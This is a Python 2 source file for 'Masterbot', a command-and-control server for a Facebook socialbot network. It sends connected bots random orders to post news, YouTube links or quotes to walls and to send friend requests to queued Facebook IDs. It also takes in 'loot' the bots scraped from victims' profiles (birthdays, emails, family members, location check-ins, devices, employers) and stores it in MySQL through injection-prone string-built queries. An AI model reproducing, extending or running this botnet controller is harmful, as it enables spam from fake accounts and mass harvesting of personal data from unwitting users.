#!/usr/bin/python


'''
Copyright (c) 2014 PuN1sh3r luiguibiker@gmail.com

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
'''

import socket
import MySQLdb
import random
import json
import multiprocessing
import urllib2
import re
import gdata.youtube
import gdata.youtube.service
import time
import hashlib
import datetime


categories = ["Autos","Music","Travel","Animals","Sports","Comedy","People","Entertainment","News","Howto","Education","Tech","Nonprofit","Movies"]
yt_videos = []
yt_service = gdata.youtube.service.YouTubeService()


for c in categories:
    uri = 'http://gdata.youtube.com/feeds/api/standardfeeds/US/most_popular_%s' % (c)
    feed = yt_service.GetYouTubeVideoFeed(uri)
    for entry in feed.entry:
        vLink = entry.media.player.url
        vLink = vLink.replace("&feature=youtube_gdata_player","")
        yt_videos.append(vLink)

try:
    dbconn = MySQLdb.connect("127.0.0.1","user","pass","DBname" )
    cursor = dbconn.cursor()

except Exception as ex:
    print ex

def addFbids(fbids):
    print "processing received fbid's....."
    for fbid in fbids:
        query = 'select count(*) from fbids where fbid=%s' %(fbid)
        try:
            cursor.execute(query)
            data = cursor.fetchone()
            result = int(data[0])
            if result == 0:
                print "fbid %s does not exists adding to db....." %(fbid)
                query2 = 'insert into fbids (fbid,sent) values ("%s","false") ' % (fbid)
                try:
                    cursor.execute(query2)
                    dbconn.commit()
                except Exception as ex:
                    print ex
            else:
                print "fbid %s was returned due to not being accepted as a friend yet or already exist on the database ...." % (fbid)
                query3 = 'update fbids set sent="false" where fbid="%s"' %(fbid)
                try:
                    cursor.execute(query3)
                    dbconn.commit()
                except Exception as ex:
                    print ex
        except Exception as ex:
            print ex

def postNews():
    browser = urllib2.build_opener()
    browser.addheaders = [('User-Agent','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:27.0) Gecko/20100101 Firefox/27.0')]
    req = browser.open("https://news.google.com/news/section?pz=1&cf=all&topic=n&siidp=5bd18ab44ca49514a94fdccc7c481112cead&ict=ln")
    response = req.read()
    news_link = re.findall(r'url=\"(.*?)\"',response)
    randnumber = random.randint(1, len(news_link) -1)
    return "write_wall::%s" % (news_link[randnumber-1])


def postytVideo():
    randnumber = random.randint(1, len(yt_videos) -1)
    #print randnumber
    return "write_wall::%s" %(yt_videos[randnumber])

def postsContent():
    try:
        reqQuote = urllib2.urlopen("http://www.iheartquotes.com/api/v1/random?format=text&source=osho+esr+literature+oneliners+bible+liberty+holygrail+powerpuff+riddles")
        result = re.sub("\[.*|--.*", " ",reqQuote.read())
    except:
        print "there was a problem with the request"
    return "write_wall::%s" % (result)

def send_frequest():
    randnumber = random.randint(1,3)
    query = "select fbid from fbids where sent='false' limit %d " %(randnumber)
    fbids = []
    try:
        cursor.execute(query)
        data = cursor.fetchall()
        for row in data:
            query2 = "update fbids set sent='true' where fbid='%s'" % (row[0])
            cursor.execute(query2)
            dbconn.commit()
            fbids.append(str(row[0]))
    except Exception as ex:
        print ex
    fbid = ",".join(fbids)
    return "send_frequest::%s" %(fbid)
    dbconn.close()

def execute_sql(sql):
    try:
        cursor.execute(sql)
        dbconn.commit()
    except Exception as ex:
        print ex

def process_loot(cargo):

    fbid = ''
    for k,v in  cargo.items():
        fbid = k
        for k1,v1 in v.items():
            print "processing data for: %s" % (fbid)
            if k1 == 'about_me':
                print "saving about me section on database... "
                work=interests =  hometown_location = relationship_status= name=devices=sex=significant_other_id= birthday = contact_email=education=profile_url =''
                columns = ','.join(v1[0].keys())
                interests =  v1[0]['interests']
                hometown_location = v1[0]['hometown_location']['name']
                relationship_status = v1[0]['relationship_status']
                name = v1[0]['name']
                #devices = v1[0]['devices'][0]
                devices = v1[0]['devices'][0]['os']

                print devices
                sex = v1[0]['sex']
                significant_other_id = v1[0]['significant_other_id']
                if v1[0]['work']:
                    work = ','.join(w['employer']['name'] for w in v1[0]['work'] )
                else:
                    work = 'none'
                birthday = v1[0]['birthday']
                contact_email = v1[0]['contact_email']
                if v1[0]['education']:
                    education =','.join( e['school']['name'] + ":" + e['type']  for e in v1[0]['education'])
                else:
                    education = 'none'

                profile_url = v1[0]['profile_url']

                sql = 'INSERT INTO users (fbid,%s) VALUES ("%s","%s","%s","%s","%s","%s","%s","%s","%s","%s","%s","%s","%s")' % (columns,fbid,interests,hometown_location,relationship_status,name,work,devices,sex,significant_other_id,birthday,contact_email,education,profile_url)
                execute_sql(sql)

            if k1 == "family":
                print "saving family section on database... "
                if v1:
                    columns = ','.join(v1[0].keys())
                    for i in v1:
                        vals =  i.values()
                        placeholders =  ', '.join(['%s'] * len(v1[0]))
                        filter1 = list(re.sub('u\'|{|}||,|\[|\]','',str(x))  for x in vals)
                        md5String = ''
                        for f in filter1:
                            md5String +=f
                        md5String  += fbid
                        md5sum = hashlib.md5(md5String).hexdigest()
                        filter1.append(md5sum)
                        filter2 = ",".join(re.sub('^{|}$|^|$','\'',str(x))  for x in filter1)
                        sql = 'INSERT INTO family (%s,relative_id,fbid) VALUES (%s,%s)' % (columns,filter2,fbid)
                        execute_sql(sql)
                else:
                    print "probably no family members were found :(...."
            if k1 == 'user_locations':

                print "saving user_locations section on database... "
                print type(v1)
                if v1:
                    columns = ','.join(v1[0].keys())

                    for i in v1:
                        placeholders =  ', '.join(['%s'] * len(v1[0]))
                        vals = i.values()
                        filter1 = list(re.sub('(u\'|{|}||,|\[|\]|\"latitude\':)','',str(x))  for x in vals)
                        filter2 = list(re.sub('(latitude\':|longitude\':|\')','',str(x))  for x in filter1)
                        md5String = ' '
                        for f in filter2:
                            md5String += f
                        md5String += fbid
                        md5sum = hashlib.md5(md5String).hexdigest()
                        filter2.append(md5sum)
                        filter2[0] = datetime.datetime.fromtimestamp(int(filter2[0])).strftime('%Y-%m-%d %H:%M:%S')
                        filter3 = ",".join(re.sub('(^|$)','\'',str(x))  for x in filter2)
                        sql = 'INSERT INTO checkins (%s,checkin_id,fbid) VALUES (%s,%s)' % (columns,filter3,fbid)
                        execute_sql(sql)

                else:
                    print "probably no location data was found.... :("
        sql = 'UPDATE fbids SET crawled="true" WHERE fbid="%s"' % (fbid)
        execute_sql(sql)


def serverInstr(s):
    try:
        while True:
            list_of_functions = [postNews,postytVideo,postsContent,send_frequest]
            c,addr_bot = s.accept()
            print "got conn from:", addr_bot
            content = random.choice(list_of_functions)()
            if(type(content) == 'dic'):
                print "is a dictionary"
                serContent = json.dumps(content)
                c.send(serContent)
            else:
                cargo = ''
                data = c.recv(2048)
                size = re.search('(^\d+)',data).group(1)
                data = re.sub('^\d+','',data)
                if int(size) < 2048:
                    cargo += data
                else:
                    cargo += data
                    for i in range(0,int(int(size)/2048)+1):
                        rdata = c.recv(2048)
                        cargo += rdata
                ser_data = json.loads(cargo)
                if ser_data:
                    for key,value in ser_data.items():
                        if key == 'pending_requests':
                            print "received pending requests or facebook ids crawled ..."
                            addFbids(value)
                        elif key == 'bot_mode':
                            print"entering bot mode..."
                            print "sending instruction:%s" %(content)
                            c.send(content)
                        elif key == 'collected_data':
                            print "collected data"
                            process_loot(value)

            c.close()
    except Exception as ex:
        print ex

if __name__ == '__main__':

    while True:
        time.sleep(3)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s_1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = "127.0.0.1"
        port1 = 1337
        s.bind(('',port1))
        s.listen(50)
        print "Masterbot listening on: %s:%s" % (host,port1)
        servInstr = multiprocessing.Process(name='serverInstr',target=serverInstr(s))
        servInstr.start()
